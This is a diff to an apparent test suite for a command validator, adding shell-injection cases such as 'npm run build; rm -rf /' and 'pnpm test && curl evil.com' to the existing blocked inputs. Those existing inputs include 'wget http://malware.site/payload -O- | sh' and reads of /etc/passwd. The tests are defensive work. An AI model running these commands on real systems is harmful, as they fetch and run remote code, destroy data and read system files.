@@ -130,6 +130,10 @@ describe("validateCommand", () => {
       ["eval $(cat /etc/passwd)"],
       ["sh exploit.sh"],
       ["wget http://malware.site/payload -O- | sh"],
+      // Shell metacharacter injection bypasses (prefix matches allowed pattern but chains a malicious command)
+      ["npm run build; rm -rf /"],
+      ["pnpm test && curl evil.com"],
+      ["make build | cat /etc/passwd"],
       [""],
       ["   "],
     ])("blocks: %s", (cmd) => {
